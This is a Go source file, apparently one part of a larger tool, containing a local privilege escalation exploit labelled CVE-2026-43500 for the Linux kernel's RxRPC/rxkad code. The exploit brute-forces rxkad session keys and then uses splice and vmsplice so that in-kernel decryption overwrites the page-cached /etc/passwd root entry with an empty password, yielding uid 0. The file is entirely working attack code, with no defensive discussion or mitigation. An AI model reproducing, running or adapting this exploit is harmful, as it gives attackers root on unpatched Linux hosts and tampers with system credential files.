package main

// RxRPC/rxkad LPE path - CVE-2026-43500
// Patches /etc/passwd root entry to "root::0:0:GGGGGG:/root:/bin/bash"
// by triggering rxkad_verify_packet_1() in-place decryption on splice'd
// file pages. Three overlapping 8-byte writes with last-write-wins ordering.

import (
	"encoding/binary"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	afRxrpc  = 33
	solRxrpc = 272

	rxrpcSecurityKey      = 1 // RXRPC_SECURITY_KEY
	rxrpcMinSecurityLevel = 4 // RXRPC_MIN_SECURITY_LEVEL (linux/rxrpc.h)
	rxrpcUserCallID       = 1 // RXRPC_USER_CALL_ID (cmsg type)
	rxrpcSecurityAuth     = 1 // RXRPC_SECURITY_AUTH

	rxrpcPacketTypeData      = 1
	rxrpcPacketTypeChallenge = 6
	rxrpcClientInitiated     = 0x01
	rxrpcLastPacket          = 0x04

	keySpecProcessKeyring = 0xFFFFFFFE // KEY_SPEC_PROCESS_KEYRING (-2 as uint32)
	keyctlInvalidate      = 3  // KEYCTL_INVALIDATE
)

// sessionKey is the attacker-chosen rxkad session key (mutable; overwritten
// per-trigger to the brute-forced K_A/K_B/K_C).
var sessionKey [8]byte

// rxrpcWireHeader mirrors struct rxrpc_wire_header (28 bytes, packed, all BE).
type rxrpcWireHeader struct {
	Epoch       uint32
	Cid         uint32
	CallNumber  uint32
	Seq         uint32
	Serial      uint32
	Type        uint8
	Flags       uint8
	UserStatus  uint8
	SecuIdx     uint8
	Cksum       uint16
	ServiceID   uint16
}

func marshalWireHeader(h rxrpcWireHeader) []byte {
	b := make([]byte, 28)
	binary.BigEndian.PutUint32(b[0:], h.Epoch)
	binary.BigEndian.PutUint32(b[4:], h.Cid)
	binary.BigEndian.PutUint32(b[8:], h.CallNumber)
	binary.BigEndian.PutUint32(b[12:], h.Seq)
	binary.BigEndian.PutUint32(b[16:], h.Serial)
	b[20] = h.Type
	b[21] = h.Flags
	b[22] = h.UserStatus
	b[23] = h.SecuIdx
	binary.BigEndian.PutUint16(b[24:], h.Cksum)
	binary.BigEndian.PutUint16(b[26:], h.ServiceID)
	return b
}

// rxkadChallenge: version(4,BE) + nonce(4,BE) + min_level(4,BE) + pad(4) = 16
func marshalChallenge(version, nonce, minLevel uint32) []byte {
	b := make([]byte, 16)
	binary.BigEndian.PutUint32(b[0:], version)
	binary.BigEndian.PutUint32(b[4:], nonce)
	binary.BigEndian.PutUint32(b[8:], minLevel)
	return b
}

// sockaddrRxrpc builds the raw binary for struct sockaddr_rxrpc.
// Layout (36 bytes):
//   [0:2]   family (uint16 LE)
//   [2:4]   service (uint16 LE)
//   [4:6]   transport_type (uint16 LE)
//   [6:8]   transport_len (uint16 LE)
//   [8:10]  sin.family (uint16 LE)
//   [10:12] sin.port (uint16 BE)
//   [12:16] sin.addr (uint32 BE)
//   [16:36] padding
func sockaddrRxrpcBytes(service, transportType, transportLen uint16, port uint16, addr [4]byte) []byte {
	b := make([]byte, 36)
	binary.LittleEndian.PutUint16(b[0:], afRxrpc)
	binary.LittleEndian.PutUint16(b[2:], service)
	binary.LittleEndian.PutUint16(b[4:], transportType)
	binary.LittleEndian.PutUint16(b[6:], transportLen)
	binary.LittleEndian.PutUint16(b[8:], syscall.AF_INET)
	binary.BigEndian.PutUint16(b[10:], port)
	copy(b[12:], addr[:])
	return b
}

func buildRxrpcV1Token(key [8]byte) []byte {
	now := uint32(time.Now().Unix())
	expires := now + 86400
	cell := "evil"
	clen := uint32(len(cell))
	pad := (4 - (clen & 3)) & 3

	var buf []byte
	put32 := func(v uint32) { b := make([]byte, 4); binary.BigEndian.PutUint32(b, v); buf = append(buf, b...) }
	putN := func(b []byte) { buf = append(buf, b...) }

	put32(0) // flags
	put32(clen)
	putN([]byte(cell))
	putN(make([]byte, pad))
	put32(1) // ntoken

	// placeholder for toklen
	toklenIdx := len(buf)
	put32(0)
	tokStart := len(buf)

	put32(2) // sec_ix = RXKAD
	put32(0) // vice_id
	put32(1) // kvno
	putN(key[:])
	put32(now)
	put32(expires)
	put32(1)              // primary_flag
	put32(8)              // ticket_len
	putN([]byte{0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC}) // ticket

	tokLen := uint32(len(buf) - tokStart)
	binary.BigEndian.PutUint32(buf[toklenIdx:], tokLen)
	return buf
}

func addRxrpcKey(desc string, key [8]byte) (uintptr, error) {
	token := buildRxrpcV1Token(key)
	typ := []byte("rxrpc\x00")
	d := []byte(desc + "\x00")
	r, _, errno := syscall.Syscall6(syscall.SYS_ADD_KEY,
		uintptr(unsafe.Pointer(&typ[0])),
		uintptr(unsafe.Pointer(&d[0])),
		uintptr(unsafe.Pointer(&token[0])),
		uintptr(len(token)),
		uintptr(uint32(keySpecProcessKeyring)),
		0)
	if errno != 0 {
		return 0, errno
	}
	return r, nil
}

func keyctlInvalidate_(key uintptr) {
	syscall.Syscall(syscall.SYS_KEYCTL, keyctlInvalidate, key, 0) //nolint:errcheck
}

// setupRxrpcClient creates an AF_RXRPC client socket bound to localPort.
func setupRxrpcClient(localPort uint16, keyname string) (int, error) {
	fd, _, errno := syscall.Syscall(syscall.SYS_SOCKET, afRxrpc, syscall.SOCK_DGRAM, syscall.AF_INET)
	if errno != 0 {
		return -1, fmt.Errorf("socket(AF_RXRPC): %w", errno)
	}
	s := int(fd)

	kn := []byte(keyname + "\x00")
	_, _, errno = syscall.Syscall6(syscall.SYS_SETSOCKOPT, uintptr(s),
		solRxrpc, rxrpcSecurityKey,
		uintptr(unsafe.Pointer(&kn[0])), uintptr(len(kn)-1), 0)
	if errno != 0 {
		syscall.Close(s)
		return -1, fmt.Errorf("RXRPC_SECURITY_KEY: %w", errno)
	}

	minLevel := int32(rxrpcSecurityAuth)
	_, _, errno = syscall.Syscall6(syscall.SYS_SETSOCKOPT, uintptr(s),
		solRxrpc, rxrpcMinSecurityLevel,
		uintptr(unsafe.Pointer(&minLevel)), 4, 0)
	if errno != 0 {
		syscall.Close(s)
		return -1, fmt.Errorf("RXRPC_MIN_SECURITY_LEVEL: %w", errno)
	}

	srx := sockaddrRxrpcBytes(0, syscall.SOCK_DGRAM, 16, localPort, [4]byte{127, 0, 0, 1})
	_, _, errno = syscall.Syscall(syscall.SYS_BIND, uintptr(s),
		uintptr(unsafe.Pointer(&srx[0])), uintptr(len(srx)))
	if errno != 0 {
		syscall.Close(s)
		return -1, fmt.Errorf("rxrpc bind :%d: %w", localPort, errno)
	}
	return s, nil
}

// setupUDPServer binds a plain UDP socket to port on 127.0.0.1.
func setupUDPServer(port uint16) (int, error) {
	s, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
	if err != nil {
		return -1, err
	}
	sa := syscall.SockaddrInet4{Port: int(port), Addr: [4]byte{127, 0, 0, 1}}
	if err := syscall.Bind(s, &sa); err != nil {
		syscall.Close(s)
		return -1, err
	}
	return s, nil
}

// udpRecvWithTimeout receives one UDP datagram with a timeout.
func udpRecvWithTimeout(fd int, buf []byte, timeoutMs int) (int, *syscall.SockaddrInet4, error) {
	var pfds [1]unix.PollFd
	pfds[0] = unix.PollFd{Fd: int32(fd), Events: unix.POLLIN}
	n, err := unix.Poll(pfds[:], timeoutMs)
	if err != nil || n <= 0 {
		return 0, nil, fmt.Errorf("poll timeout")
	}
	rn, from, err := syscall.Recvfrom(fd, buf, 0)
	if err != nil {
		return 0, nil, err
	}
	sa, _ := from.(*syscall.SockaddrInet4)
	return rn, sa, nil
}

// rxrpcClientInitiateCall sends the initial DATA packet to the fake server.
func rxrpcClientInitiateCall(cliFd int, srvPort, serviceID uint16) error {
	data := []byte("PINGPING")
	srx := sockaddrRxrpcBytes(serviceID, syscall.SOCK_DGRAM, 16, srvPort, [4]byte{127, 0, 0, 1})

	userCallID := uint64(0xDEAD)
	cmsgData := make([]byte, 8)
	binary.LittleEndian.PutUint64(cmsgData, userCallID)
	cmsgLen := syscall.CmsgLen(len(cmsgData))
	cbuf := make([]byte, cmsgLen)
	hdr := (*syscall.Cmsghdr)(unsafe.Pointer(&cbuf[0]))
	hdr.Level = solRxrpc
	hdr.Type = rxrpcUserCallID
	hdr.SetLen(cmsgLen)
	copy(cbuf[syscall.SizeofCmsghdr:], cmsgData)

	iov := syscall.Iovec{Base: &data[0], Len: uint64(len(data))}
	msg := syscall.Msghdr{
		Name:       &srx[0],
		Namelen:    uint32(len(srx)),
		Iov:        &iov,
		Iovlen:     1,
		Control:    &cbuf[0],
		Controllen: uint64(len(cbuf)),
	}

	fl, _ := unix.FcntlInt(uintptr(cliFd), syscall.F_GETFL, 0)
	unix.FcntlInt(uintptr(cliFd), syscall.F_SETFL, fl|syscall.O_NONBLOCK) //nolint

	_, _, errno := syscall.Syscall(syscall.SYS_SENDMSG, uintptr(cliFd),
		uintptr(unsafe.Pointer(&msg)), 0)
	unix.FcntlInt(uintptr(cliFd), syscall.F_SETFL, fl) //nolint

	if errno != 0 && errno != syscall.EAGAIN {
		return fmt.Errorf("rxrpc sendmsg: %w", errno)
	}
	return nil
}

var triggerSeq int

// doOneTrigger performs one kernel rxkad decrypt trigger at spliceOff in targetFd.
func doOneTrigger(targetFd int, spliceOff int64, spliceLen int) error {
	keyname := fmt.Sprintf("evil%d", triggerSeq)
	triggerSeq++

	key, err := addRxrpcKey(keyname, sessionKey)
	if err != nil {
		return fmt.Errorf("add_key(%s): %w", keyname, err)
	}
	defer keyctlInvalidate_(key)

	portS := uint16(7777 + (triggerSeq*2)%200)
	portC := portS + 1
	svcID := uint16(1234)

	udpSrv, err := setupUDPServer(portS)
	if err != nil {
		return fmt.Errorf("setupUDPServer(%d): %w", portS, err)
	}
	defer syscall.Close(udpSrv)

	rxCli, err := setupRxrpcClient(portC, keyname)
	if err != nil {
		return fmt.Errorf("setupRxrpcClient(%d): %w", portC, err)
	}
	defer syscall.Close(rxCli)

	if err := rxrpcClientInitiateCall(rxCli, portS, svcID); err != nil {
		return err
	}

	pkt := make([]byte, 2048)
	n, cliSA, err := udpRecvWithTimeout(udpSrv, pkt, 1500)
	if err != nil || n < 28 {
		return fmt.Errorf("udp recv CONNECT: n=%d %v", n, err)
	}

	epoch := binary.BigEndian.Uint32(pkt[0:])
	cid := binary.BigEndian.Uint32(pkt[4:])
	callN := binary.BigEndian.Uint32(pkt[8:])
	svcIn := binary.BigEndian.Uint16(pkt[26:])
	cliPort := uint16(cliSA.Port)

	// Send CHALLENGE
	chHdr := rxrpcWireHeader{
		Epoch: epoch, Cid: cid,
		Serial: 0x10000, Type: rxrpcPacketTypeChallenge,
		SecuIdx: 2, ServiceID: svcIn,
	}
	ch := append(marshalWireHeader(chHdr), marshalChallenge(2, 0xDEADBEEF, 1)...)
	dstTo := syscall.SockaddrInet4{Port: int(cliPort), Addr: [4]byte{127, 0, 0, 1}}
	syscall.Sendto(udpSrv, ch, 0, &dstTo) //nolint:errcheck

	// Drain RESPONSE (best-effort)
	for i := 0; i < 4; i++ {
		udpRecvWithTimeout(udpSrv, pkt, 500) //nolint:errcheck
	}

	// Compute csum_iv and wire cksum using current sessionKey.
	csumIv, err := computeCsumIv(epoch, cid, 2, sessionKey)
	if err != nil {
		return err
	}
	cksum, err := computeCksum(cid, callN, 1, sessionKey, csumIv)
	if err != nil {
		return err
	}

	// Build malicious DATA header.
	malHdr := rxrpcWireHeader{
		Epoch: epoch, Cid: cid, CallNumber: callN,
		Seq: 1, Serial: 0x42000,
		Type: rxrpcPacketTypeData, Flags: rxrpcLastPacket,
		SecuIdx: 2, Cksum: cksum, ServiceID: svcIn,
	}
	malBytes := marshalWireHeader(malHdr)

	// Connect udpSrv to client for splice.
	syscall.Connect(udpSrv, &syscall.SockaddrInet4{Port: int(cliPort), Addr: [4]byte{127, 0, 0, 1}}) //nolint

	// pipe + vmsplice header + splice file → pipe → udpSrv
	var p [2]int
	if err := syscall.Pipe(p[:]); err != nil {
		return err
	}
	defer func() { syscall.Close(p[0]); syscall.Close(p[1]) }()

	iov := unix.Iovec{Base: &malBytes[0], Len: uint64(len(malBytes))}
	if _, err := unix.Vmsplice(p[1], []unix.Iovec{iov}, 0); err != nil {
		return fmt.Errorf("vmsplice: %w", err)
	}
	off := spliceOff
	if _, err := unix.Splice(targetFd, &off, p[1], nil, spliceLen, unix.SPLICE_F_NONBLOCK); err != nil {
		return fmt.Errorf("splice file→pipe: %w", err)
	}
	if _, err := unix.Splice(p[0], nil, udpSrv, nil, len(malBytes)+spliceLen, 0); err != nil {
		return fmt.Errorf("splice pipe→udp: %w", err)
	}

	// recvmsg to drive the kernel's rxkad verify_packet path.
	fl, _ := unix.FcntlInt(uintptr(rxCli), syscall.F_GETFL, 0)
	unix.FcntlInt(uintptr(rxCli), syscall.F_SETFL, fl|syscall.O_NONBLOCK) //nolint
	recvBuf := make([]byte, 2048)
	for round := 0; round < 5; round++ {
		n, _, err := syscall.Recvfrom(rxCli, recvBuf, 0)
		if n > 0 {
			break
		}
		if err == syscall.EAGAIN {
			time.Sleep(20 * time.Millisecond)
		} else {
			break
		}
	}
	unix.FcntlInt(uintptr(rxCli), syscall.F_SETFL, fl) //nolint
	return nil
}

// rxrpcLPE runs the full rxrpc/rxkad LPE path against /etc/passwd.
func rxrpcLPE() bool {
	fmt.Fprintln(os.Stderr, "\n=== rxrpc/rxkad LPE (uid=1000 → root) ===")

	// Autoload rxrpc module.
	dummy, _, errno := syscall.Syscall(syscall.SYS_SOCKET, afRxrpc, syscall.SOCK_DGRAM, syscall.AF_INET)
	if errno != 0 {
		fmt.Fprintf(os.Stderr, "[!] socket(AF_RXRPC): %v - module not available\n", errno)
		return false
	}
	syscall.Close(int(dummy))
	fmt.Fprintln(os.Stderr, "[+] rxrpc module autoloaded")

	targetPath := "/etc/passwd"
	if e := os.Getenv("POC_TARGET_FILE"); e != "" {
		targetPath = e
	}

	rfd, err := syscall.Open(targetPath, syscall.O_RDONLY, 0)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] open %s: %v\n", targetPath, err)
		return false
	}
	defer syscall.Close(rfd)

	// mmap first page to pin it in page cache.
	mapSlice, err := unix.Mmap(rfd, 0, 4096, unix.PROT_READ, unix.MAP_SHARED)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] mmap: %v\n", err)
		return false
	}
	defer unix.Munmap(mapSlice) //nolint:errcheck
	if string(mapSlice[:9]) == "root::0:0" {
		fmt.Fprintln(os.Stderr, "[+] already patched")
		return true
	}

	// Read three 8-byte ciphertexts at offsets 4, 6, 8.
	var Ca, Cb, Cc [8]byte
	offA, offB, offC := int64(4), int64(6), int64(8)
	readAt := func(fd int, off int64, dst []byte) error {
		_, err := unix.Pread(fd, dst, off)
		return err
	}
	if err := readAt(rfd, offA, Ca[:]); err != nil {
		fmt.Fprintln(os.Stderr, "[!] pread Ca:", err); return false
	}
	if err := readAt(rfd, offB, Cb[:]); err != nil {
		fmt.Fprintln(os.Stderr, "[!] pread Cb:", err); return false
	}
	if err := readAt(rfd, offC, Cc[:]); err != nil {
		fmt.Fprintln(os.Stderr, "[!] pread Cc:", err); return false
	}

	if !fcryptSelftest() {
		fmt.Fprintln(os.Stderr, "[!] fcrypt selftest FAILED"); return false
	}
	fmt.Fprintln(os.Stderr, "[+] fcrypt selftest OK")

	maxIters := uint64(10_000_000_000)
	if e := os.Getenv("LPE_MAX_ITERS"); e != "" {
		fmt.Sscan(e, &maxIters)
	}
	seed := uint64(time.Now().UnixNano()) * 0x100000001

	fmt.Fprintln(os.Stderr, "\n=== STAGE 1a: K_A (chars 4-5 = \"::\")")
	Ka, Pa, ok := findKOffline(Ca, maxIters, checkPa, seed, "K_A")
	if !ok {
		fmt.Fprintln(os.Stderr, "[!] K_A search exhausted"); return false
	}

	// Cb_actual: Pa[2:8] + Cb[6:8]
	var CbActual [8]byte
	copy(CbActual[:6], Pa[2:8])
	copy(CbActual[6:], Cb[6:8])

	fmt.Fprintln(os.Stderr, "\n=== STAGE 1b: K_B (chars 6-7 = \"0:\")")
	Kb, Pb, ok := findKOffline(CbActual, maxIters, checkPb, seed^0xa5a5a5a5a5a5a5a5, "K_B")
	if !ok {
		fmt.Fprintln(os.Stderr, "[!] K_B search exhausted"); return false
	}

	// Cc_actual: Pb[2:8] + Cc[6:8]
	var CcActual [8]byte
	copy(CcActual[:6], Pb[2:8])
	copy(CcActual[6:], Cc[6:8])

	fmt.Fprintln(os.Stderr, "\n=== STAGE 1c: K_C (chars 8-15 = \"0:GGGGGG:\")")
	Kc, _, ok := findKOffline(CcActual, maxIters, checkPc, seed^0x5a5a5a5a5a5a5a5a, "K_C")
	if !ok {
		fmt.Fprintln(os.Stderr, "[!] K_C search exhausted"); return false
	}

	fmt.Fprintln(os.Stderr, "\n=== STAGE 2a: kernel trigger A @ off", offA)
	copy(sessionKey[:], Ka[:])
	if err := doOneTrigger(rfd, offA, 8); err != nil {
		fmt.Fprintln(os.Stderr, "[!] trigger A:", err); return false
	}

	fmt.Fprintln(os.Stderr, "\n=== STAGE 2b: kernel trigger B @ off", offB)
	copy(sessionKey[:], Kb[:])
	if err := doOneTrigger(rfd, offB, 8); err != nil {
		fmt.Fprintln(os.Stderr, "[!] trigger B:", err); return false
	}

	fmt.Fprintln(os.Stderr, "\n=== STAGE 2c: kernel trigger C @ off", offC)
	copy(sessionKey[:], Kc[:])
	if err := doOneTrigger(rfd, offC, 8); err != nil {
		fmt.Fprintln(os.Stderr, "[!] trigger C:", err); return false
	}

	m := mapSlice
	ok2 := m[4] == ':' && m[5] == ':' &&
		m[6] == '0' && m[7] == ':' &&
		m[8] == '0' && m[9] == ':' &&
		m[15] == ':'
	if !ok2 {
		fmt.Fprintln(os.Stderr, "[!] post-trigger sanity check failed"); return false
	}
	fmt.Fprintln(os.Stderr, "\n[!!!] HIT - root entry patched, empty passwd, uid=0")
	return true
}
